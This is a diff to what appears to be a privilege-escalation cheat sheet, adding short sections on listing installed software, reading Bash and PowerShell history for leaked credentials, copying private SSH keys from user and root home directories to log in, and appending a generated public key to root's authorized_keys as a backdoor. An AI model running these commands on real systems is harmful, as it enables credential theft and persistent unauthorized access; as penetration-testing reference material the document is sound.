@@ -457,6 +457,39 @@ $ ls /etc/cron.d
 $ ls /var/spool/cron/crontabs/root
 ```
 
+- Vulnerable Software
+
+```
+$ dpkg -l
+C:\> dir "C:\Program Files"
+C:\> dir "C:\Program Files (x86)"
+```
+
+- Exposed Credentials
+
+```
+$ cat .bash_history
+PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath
+```
+
+- SSH Key Login
+
+```
+$ cat /home/user/.ssh/id_rsa
+$ cat /root/.ssh/id_rsa
+$ chmod 600 id_rsa
+$  ssh <user>@<IP address> -i id_rsa
+```
+
+- SSH Authorized Keys
+
+```
+$ ssh-keygen -f key
+$ cat key.pub
+$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+$ ssh <user>@<IP address> -i key
+```
+
 - Whoami
 
 ```
